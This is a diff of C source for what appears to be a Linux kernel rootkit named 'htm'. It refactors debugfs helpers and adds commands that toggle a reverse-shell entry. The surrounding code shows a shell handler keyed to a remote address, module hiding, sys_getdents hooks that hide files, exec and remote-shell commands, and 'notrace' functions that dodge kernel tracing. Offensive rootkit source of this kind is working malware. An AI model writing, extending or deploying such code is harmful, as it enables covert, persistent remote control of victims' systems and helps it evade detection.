@@ -31,16 +31,16 @@ static notrace int _htm_su_handler(const char *args)
 
 static notrace int _htm_shell_handler(__be32 *saddr)
 {
-	int ret, ret_debugfs;
+	int ret, ret_dfs;
 	char cmd[HTM_MAX_STRING];
 
-	char *dir_name = htm_debugfs_name_dir();
-	char *rsh_name = htm_debugfs_name_rsh();
-	char *bashrc_name = htm_debugfs_name_bashrc();
+	char *dir_name = htm_dfs_name_dir();
+	char *rsh_name = htm_dfs_name_rsh();
+	char *bashrc_name = htm_dfs_name_bashrc();
 
 	memset(cmd, 0x00, sizeof(cmd));
 
-	ret_debugfs = htm_debugfs_create_all();
+	ret_dfs = htm_dfs_create_rsh();
 
 	ret = scnprintf(
 		cmd, sizeof(cmd) - 1,
@@ -55,10 +55,10 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 
 	// If `debugfs` wasn't enabled, disable it in user space to prevent a race condition due to
 	// UMH_NO_WAIT
-	if (! ret_debugfs) {
+	if (! ret_dfs) {
 		scnprintf(
 			cmd + ret, (sizeof(cmd) - ret),
-			";kill -%u %u", HTM_SIG_DISABLE_DEBUGFS, HTM_PID
+			";kill -%u %u", HTM_SIG_DISABLE_DFS_RSH, HTM_PID
 		);
 	}
 
@@ -70,8 +70,10 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 notrace bool is_htm_command_atomic(const char *cmd)
 {
 	return (
-		! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd) ||
-		! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd)  ||
+		! strcmp(HTM_CMD_DISABLE_DFS, cmd)     ||
+		! strcmp(HTM_CMD_DISABLE_DFS_RSH, cmd) ||
+		! strcmp(HTM_CMD_ENABLE_DFS, cmd)      ||
+		! strcmp(HTM_CMD_ENABLE_DFS_RSH, cmd)  ||
 		! strcmp(HTM_CMD_EXEC, cmd)            ||
 		! strcmp(HTM_CMD_HIDE_MODULE, cmd)     ||
 		! strcmp(HTM_CMD_RSH, cmd)             ||
@@ -83,11 +85,13 @@ notrace bool is_htm_command(const char *cmd)
 {
 	return (
 		! strcmp(HTM_CMD_DISABLE_CDD, cmd)     ||
-		! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd) ||
+		! strcmp(HTM_CMD_DISABLE_DFS, cmd)     ||
+		! strcmp(HTM_CMD_DISABLE_DFS_RSH, cmd) ||
 		! strcmp(HTM_CMD_DISABLE_FS, cmd)      ||
 		! strcmp(HTM_CMD_DISABLE_NF, cmd)      ||
 		! strcmp(HTM_CMD_ENABLE_CDD, cmd)      ||
-		! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd)  ||
+		! strcmp(HTM_CMD_ENABLE_DFS, cmd)      ||
+		! strcmp(HTM_CMD_ENABLE_DFS_RSH, cmd)  ||
 		! strcmp(HTM_CMD_ENABLE_FS, cmd)       ||
 		! strcmp(HTM_CMD_ENABLE_NF, cmd)       ||
 		! strcmp(HTM_CMD_EXEC, cmd)            ||
@@ -130,8 +134,11 @@ notrace int htm_command(const char *cmd, __be32 *saddr)
 	if (! strcmp(HTM_CMD_DISABLE_CDD, cmd))
 		return htm_cdd_destroy();
 
-	if (! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd))
-		return htm_debugfs_remove_all();
+	if (! strcmp(HTM_CMD_DISABLE_DFS, cmd))
+		return htm_dfs_remove_all();
+
+	if (! strcmp(HTM_CMD_DISABLE_DFS_RSH, cmd))
+		return htm_dfs_remove_rsh();
 
 	if (! strcmp(HTM_CMD_DISABLE_FS, cmd)) {
 		if ((ret = htm_hook_uninstall(&hook_sys_getdents)))
@@ -162,8 +169,11 @@ notrace int htm_command(const char *cmd, __be32 *saddr)
 	if (! strcmp(HTM_CMD_ENABLE_CDD, cmd))
 		return htm_cdd_create();
 
-	if (! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd))
-		return htm_debugfs_create_all();
+	if (! strcmp(HTM_CMD_ENABLE_DFS, cmd))
+		return htm_dfs_create_all();
+
+	if (! strcmp(HTM_CMD_ENABLE_DFS_RSH, cmd))
+		return htm_dfs_create_rsh();
 
 	if (! strcmp(HTM_CMD_ENABLE_FS, cmd)) {
 		if ((ret = htm_hook_install(&hook_sys_getdents)))
